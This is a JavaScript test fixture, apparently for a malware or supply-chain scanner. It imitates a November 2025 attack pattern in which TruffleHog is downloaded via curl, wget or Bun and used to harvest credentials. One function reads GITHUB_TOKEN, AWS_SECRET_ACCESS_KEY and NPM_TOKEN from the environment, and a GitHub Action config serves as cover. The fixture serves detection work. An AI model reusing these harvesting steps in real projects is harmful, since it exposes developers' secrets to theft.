// Test file: November 2025 enhanced TruffleHog patterns
// This file tests the new TruffleHog detection patterns added for the November 2025 attack

const { execSync } = require('child_process');

// November 2025 pattern: Automated TruffleHog download and credential scanning
function setupCredentialHarvesting() {
    console.log("Setting up credential harvesting...");

    // Pattern 1: Download and scan with TruffleHog
    const downloadScript = `
        curl -L -o trufflehog https://github.com/trufflesecurity/trufflehog/releases/download/latest/trufflehog
        chmod +x trufflehog
        ./trufflehog scan --output-format=json . > credentials.json
    `;

    // Pattern 2: TruffleHog environment token harvesting
    const environmentScan = {
        tool: "TruffleHog",
        target: "environment variables",
        credentials: {
            "github_token": process.env.GITHUB_TOKEN,
            "aws_env": process.env.AWS_SECRET_ACCESS_KEY,
            "npm_token": process.env.NPM_TOKEN
        }
    };

    return environmentScan;
}

// November 2025 pattern: TruffleHog in GitHub Actions for credential theft
function setupGitHubActionsTruffleHog() {
    const actionConfig = {
        name: "TruffleHog Security Scan",
        uses: "trufflesecurity/trufflehog@main",
        with: {
            path: "./",
            base: "main",
            head: "HEAD"
        }
    };

    // This looks legitimate but is actually part of credential theft
    console.log("Setting up GitHub Action with TruffleHog for credential theft");
    return actionConfig;
}

// November 2025 pattern: Dynamic TruffleHog download via Bun
function downloadViaBun() {
    const bunCommand = `
        bunExecutable --run "
            const { spawn } = require('child_process');
            const trufflehog = spawn('curl', ['-L', 'https://github.com/trufflesecurity/trufflehog/releases/download/latest/trufflehog']);
            trufflehog.on('close', (code) => {
                console.log('TruffleHog downloaded');
                // Run credential scan
            });
        "
    `;

    console.log("Downloading TruffleHog via Bun runtime");
    return bunCommand;
}

// Pattern: wget TruffleHog download
function downloadViaWget() {
    const wgetCommand = "wget https://github.com/trufflesecurity/trufflehog/releases/download/latest/trufflehog -O /tmp/trufflehog";
    console.log("Using wget to download TruffleHog for credential scanning");
    return wgetCommand;
}

// Export for testing
module.exports = {
    setupCredentialHarvesting,
    setupGitHubActionsTruffleHog,
    downloadViaBun,
    downloadViaWget
};